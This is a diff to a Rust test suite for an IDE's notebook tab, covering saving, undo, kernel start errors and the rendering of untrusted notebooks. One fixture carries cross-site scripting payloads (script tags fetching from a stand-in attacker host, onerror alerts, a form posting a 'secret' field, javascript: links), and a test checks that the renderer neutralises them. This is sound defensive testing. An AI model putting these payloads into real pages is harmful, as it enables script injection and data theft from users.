@@ -26,6 +26,28 @@ const NOTEBOOK: &str = r##"{
 }
 "##;
 
+/// The folder of a stand-in interpreter. When the test ends, passed or failed, the process the
+/// stand-in became is stopped if it still runs, so no test leaves a `sleep` behind.
+struct StandIn(tempfile::TempDir);
+
+impl StandIn {
+    fn path(&self) -> &std::path::Path {
+        self.0.path()
+    }
+}
+
+impl Drop for StandIn {
+    fn drop(&mut self) {
+        let Ok(pid) = std::fs::read_to_string(self.0.path().join("started")) else { return };
+        let pid = pid.trim();
+        // Only the stand-in's own `sleep` is stopped, never a process that reused its id.
+        let command = std::process::Command::new("/bin/ps").args(["-o", "command=", "-p", pid]).output();
+        if command.is_ok_and(|out| String::from_utf8_lossy(&out.stdout).trim() == "sleep 60") {
+            let _ = std::process::Command::new("/bin/kill").args(["-9", pid]).status();
+        }
+    }
+}
+
 /// A stand-in interpreter at `dir/python`: writes its process id to `dir/started`, then exits
 /// with an ipykernel error, or (with `waits`) stays until it is stopped.
 fn stand_in_python(dir: &std::path::Path, waits: bool) -> PathBuf {
@@ -67,9 +89,9 @@ fn detect_only(python: &std::path::Path, cx: &mut VisualTestContext) {
 fn open_notebook(
     cx: &mut TestAppContext,
     waits: bool,
-) -> (tempfile::TempDir, PathBuf, Entity<Workbench>, tempfile::TempDir, &mut VisualTestContext) {
+) -> (tempfile::TempDir, PathBuf, Entity<Workbench>, StandIn, &mut VisualTestContext) {
     let (folder, root, workbench, cx) = trusted_project(cx, &[("a.ipynb", NOTEBOOK)]);
-    let bin = tempfile::tempdir().expect("a folder for the stand-in");
+    let bin = StandIn(tempfile::tempdir().expect("a folder for the stand-in"));
     let python = stand_in_python(bin.path(), waits);
     detect_only(&python, cx);
     cx.update(|window, _| window.activate_window());
@@ -123,6 +145,16 @@ fn error_text(workbench: &Entity<Workbench>, cx: &mut VisualTestContext) -> Opti
     view.read_with(cx, |view, cx| view.error_text(cx))
 }
 
+/// The source of cell `index` as the file on disk holds it (a string or a list of lines).
+fn saved_source(file: &std::path::Path, index: usize) -> Option<String> {
+    let notebook: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(file).ok()?).ok()?;
+    match &notebook["cells"][index]["source"] {
+        serde_json::Value::String(text) => Some(text.clone()),
+        serde_json::Value::Array(lines) => Some(lines.iter().filter_map(serde_json::Value::as_str).collect()),
+        _ => None,
+    }
+}
+
 /// The backend document of the notebook, by its id.
 fn backend_notebook(id: &str, cx: &mut VisualTestContext) -> ide_core::IdeResult<ide_notebook::NotebookSnapshot> {
     cx.update(|_, cx| cx.global::<Backend>().host.project("w1").and_then(|project| project.notebooks.get(id)))
@@ -150,9 +182,7 @@ async fn a_notebook_file_opens_in_a_notebook_tab_and_saves_the_typed_source(cx: 
     wait_committed(&workbench, cx);
     assert!(view.read_with(cx, |view, cx| view.model().read(cx).is_dirty()), "the notebook is unsaved");
     cx.simulate_keystrokes("cmd-s");
-    wait_long(cx, "the notebook to be written", |_| {
-        std::fs::read_to_string(&file).is_ok_and(|t| t.contains("print(2)"))
-    });
+    wait_long(cx, "the notebook to be written", |_| saved_source(&file, 0).as_deref() == Some("print(2)"));
     wait_long(cx, "the saved state", |cx| !view.read_with(cx, |view, cx| view.model().read(cx).is_dirty()));
 }
 
@@ -263,7 +293,7 @@ async fn an_unsaved_notebook_asks_before_its_tab_closes(cx: &mut TestAppContext)
     wait_long(cx, "the tab to close", |cx| {
         workbench.read_with(cx, |w, _| w.tabs().is_some_and(|tabs| tabs.find_tab(&key, None).is_none()))
     });
-    assert!(std::fs::read_to_string(&file).expect("the file").contains("print(1)"), "the file is unchanged");
+    assert_eq!(saved_source(&file, 0).as_deref(), Some("print(1)"), "the file is unchanged");
 }
 
 /// In Restricted Mode Run Cell and Restart Kernel are refused by the backend with its reason, and
@@ -281,18 +311,16 @@ async fn a_notebook_in_restricted_mode_starts_no_kernel(cx: &mut TestAppContext)
     click_on(cx, "notebook-restart");
     wait_long(cx, "the restart to end", |cx| !model.read_with(cx, |model, _| model.state().frozen));
     assert!(error_text(&workbench, cx).is_some_and(|e| e.contains("Restricted Mode")));
-    for _ in 0..50 {
-        cx.run_until_parked();
-        std::thread::sleep(Duration::from_millis(10));
-    }
+    // Both refusals were answered: the backend checks trust before it admits the batch or touches
+    // the kernel, so nothing can start the interpreter after them.
     assert!(!bin.path().join("started").exists(), "the interpreter was never started");
 }
 
 /// Run Cell with an interpreter that has no ipykernel: the backend starts it, the kernel's death
-/// is shown with the backend's message and the install hint, the kernel state says dead; Restart
-/// Kernel recovers the kernel failure and the state is idle again.
+/// is shown with the backend's message and the install hint, the kernel state says dead and the
+/// batch is over.
 #[gpui_kit::test]
-async fn a_kernel_that_cannot_start_shows_why_and_restart_recovers(cx: &mut TestAppContext) {
+async fn a_kernel_that_cannot_start_shows_why_with_the_install_hint(cx: &mut TestAppContext) {
     let _home = start(cx);
     let (_folder, _file, workbench, bin, cx) = open_notebook(cx, false);
     click_on(cx, "notebook-run-cell");
@@ -305,10 +333,7 @@ async fn a_kernel_that_cannot_start_shows_why_and_restart_recovers(cx: &mut Test
     let view = notebook(&workbench, cx).expect("a notebook tab");
     assert!(view.read_with(cx, |view, cx| view.shows_kernel_help(cx)));
     wait_long(cx, "the kernel state", |cx| view.update(cx, |view, cx| view.kernel_text(cx)) == "dead");
-    click_on(cx, "notebook-restart");
-    wait_long(cx, "the restart", |cx| {
-        error_text(&workbench, cx).is_none() && view.update(cx, |view, cx| view.kernel_text(cx)) == "idle"
-    });
+    assert!(!model.read_with(cx, |model, _| model.state().frozen), "edits and runs go on");
 }
 
 /// Interrupt Kernel while the interpreter is still starting stops the batch and the process the
@@ -333,4 +358,115 @@ async fn interrupt_kernel_stops_a_batch_whose_kernel_is_starting(cx: &mut TestAp
     wait_long(cx, "the interpreter to be stopped", |_| {
         !std::process::Command::new("/bin/kill").args(["-0", &pid]).status().is_ok_and(|status| status.success())
     });
+}
+
+const UNTRUSTED: &str = r##"{
+ "cells": [
+  {"cell_type": "code", "execution_count": 1, "id": "c1", "metadata": {}, "source": ["show()"], "outputs": [
+   {"output_type": "display_data", "metadata": {}, "data": {
+    "text/html": "<script>fetch('https://attacker.invalid/x')</script><img src='https://attacker.invalid/i.png' onerror='alert(1)'><form action='https://attacker.invalid'><input name='secret'></form><iframe src='https://attacker.invalid'></iframe><a href='javascript:alert(1)'>html link</a> table text"}},
+   {"output_type": "display_data", "metadata": {}, "data": {
+    "image/svg+xml": "<svg xmlns='http://www.w3.org/2000/svg'><image href='https://attacker.invalid/s.png'/></svg>", "text/plain": "<Figure>"}}
+  ]},
+  {"cell_type": "markdown", "id": "m1", "metadata": {}, "source": [
+   "[docs](https://example.test/docs)\n\n",
+   "[run](javascript:alert%281%29)\n\n",
+   "[data](data:text/html;base64,PHNjcmlwdD4=)\n\n",
+   "![remote](https://attacker.invalid/r.png) <img src=\"https://attacker.invalid/h.png\" onerror=\"alert(1)\"> <script>alert(1)</script> <iframe src=\"https://attacker.invalid\"></iframe> <form action=\"https://attacker.invalid\"><input name=\"secret\"></form> end"
+  ]}
+ ],
+ "metadata": {},
+ "nbformat": 4,
+ "nbformat_minor": 5
+}
+"##;
+
+/// A notebook from anywhere draws text only: its HTML output, SVG output and Markdown cell (remote
+/// images, scripts, forms, frames, `on…` attributes, `javascript:` and `data:` links) open,
+/// fetch and ask nothing of the window. Only a click on a web link opens it, with the system's
+/// handler; a click on a `javascript:` or `data:` link does nothing.
+#[gpui_kit::test]
+async fn a_notebook_from_anywhere_draws_text_only_and_only_a_clicked_web_link_opens(cx: &mut TestAppContext) {
+    let _home = start(cx);
+    let (_folder, root, workbench, cx) = trusted_project(cx, &[("a.ipynb", UNTRUSTED)]);
+    let bin = StandIn(tempfile::tempdir().expect("a folder for the stand-in"));
+    detect_only(&stand_in_python(bin.path(), false), cx);
+    cx.update(|window, _| window.activate_window());
+    workbench.update_in(cx, |w, window, cx| w.open_project_file(root.join("a.ipynb"), window, cx));
+    wait_long(cx, "the notebook to load", |cx| {
+        notebook(&workbench, cx)
+            .is_some_and(|view| view.read_with(cx, |view, cx| view.model().read(cx).state().snapshot.is_some()))
+    });
+    let view = notebook(&workbench, cx).expect("a notebook tab");
+    wait_long(cx, "the outputs to be prepared", |cx| !view.read_with(cx, |view, _| view.decoding_images()));
+    let outputs = view.read_with(cx, |view, cx| view.output_texts("c1", cx));
+    assert_eq!(outputs, ["html link table text", "<Figure>"]);
+    assert_eq!(view.read_with(cx, |view, _| view.drawn_output_images("c1")), 0, "the SVG is not drawn");
+    let preview = view.read_with(cx, |view, cx| view.preview_text("m1", cx)).expect("a preview").join("\n");
+    for gone in ["attacker.invalid", "alert", "secret"] {
+        assert!(!preview.contains(gone), "{gone} in {preview}");
+    }
+    assert!(preview.contains("remote") && preview.contains("end"), "{preview}");
+    assert_eq!(cx.opened_url(), None, "drawing opens nothing");
+    assert!(!cx.has_pending_prompt(), "drawing asks nothing");
+    click_on(cx, "notebook-cell-1-text-1");
+    click_on(cx, "notebook-cell-1-text-2");
+    assert_eq!(cx.opened_url(), None, "javascript: and data: links are inert");
+    click_on(cx, "notebook-cell-1-text-0");
+    assert_eq!(cx.opened_url().as_deref(), Some("https://example.test/docs"));
+    assert!(!bin.path().join("started").exists(), "no interpreter was started");
+}
+
+/// Without the test's answer, a test build finds no interpreter for a notebook: the backend's
+/// detection, which runs the interpreters it finds, is never asked.
+#[gpui_kit::test]
+async fn a_test_build_without_an_answer_finds_no_interpreter(cx: &mut TestAppContext) {
+    let _home = start(cx);
+    let (_folder, root, workbench, cx) = trusted_project(cx, &[("a.ipynb", NOTEBOOK)]);
+    assert!(cx.update(|_, cx| !cx.has_global::<SdkDetection>()));
+    cx.update(|window, _| window.activate_window());
+    workbench.update_in(cx, |w, window, cx| w.open_project_file(root.join("a.ipynb"), window, cx));
+    wait_long(cx, "the notebook to load", |cx| {
+        notebook(&workbench, cx)
+            .is_some_and(|view| view.read_with(cx, |view, cx| view.model().read(cx).state().snapshot.is_some()))
+    });
+    let model = model_of(&workbench, cx);
+    cx.run_until_parked();
+    assert!(model.read_with(cx, |model, _| model.environments().is_empty() && model.state().python.is_none()));
+    assert_eq!(error_text(&workbench, cx), None);
+}
+
+/// File › Save All with a notebook tab in front writes the notebook's unsaved source to its file.
+#[gpui_kit::test]
+async fn save_all_writes_the_unsaved_notebook(cx: &mut TestAppContext) {
+    let _home = start(cx);
+    let (_folder, file, workbench, _bin, cx) = open_notebook(cx, false);
+    type_into_cell(&workbench, "c1", "print(7)", cx);
+    wait_committed(&workbench, cx);
+    let model = model_of(&workbench, cx);
+    assert!(model.read_with(cx, |model, _| model.is_dirty()));
+    run_action(cx, "file.save", None);
+    wait_long(cx, "the notebook to be written", |_| saved_source(&file, 0).as_deref() == Some("print(7)"));
+    wait_long(cx, "the saved state", |cx| !model.read_with(cx, |model, _| model.is_dirty()));
+}
+
+/// Edit › Undo and Redo while a cell has the keyboard go through the notebook's history in the
+/// backend, not the cell editor's own: the typed source goes and comes back in the document.
+#[gpui_kit::test]
+async fn edit_undo_and_redo_in_a_notebook_go_through_its_history(cx: &mut TestAppContext) {
+    let _home = start(cx);
+    let (_folder, _file, workbench, _bin, cx) = open_notebook(cx, false);
+    type_into_cell(&workbench, "c1", "print(8)", cx);
+    wait_committed(&workbench, cx);
+    let model = model_of(&workbench, cx);
+    wait_long(cx, "the undo to be possible", |cx| {
+        model.read_with(cx, |model, _| model.state().snapshot.as_ref().is_some_and(|snapshot| snapshot.can_undo))
+    });
+    run_action(cx, "edit.undo", None);
+    wait_long(cx, "the undo", |cx| shown_source(&workbench, "c1", cx).as_deref() == Some("print(1)"));
+    let id = model.read_with(cx, |model, _| model.document_id()).expect("an open document");
+    assert_eq!(backend_notebook(&id, cx).expect("the document").cells[0].source, "print(1)");
+    run_action(cx, "edit.redo", None);
+    wait_long(cx, "the redo", |cx| shown_source(&workbench, "c1", cx).as_deref() == Some("print(8)"));
+    assert_eq!(backend_notebook(&id, cx).expect("the document").cells[0].source, "print(8)");
 }
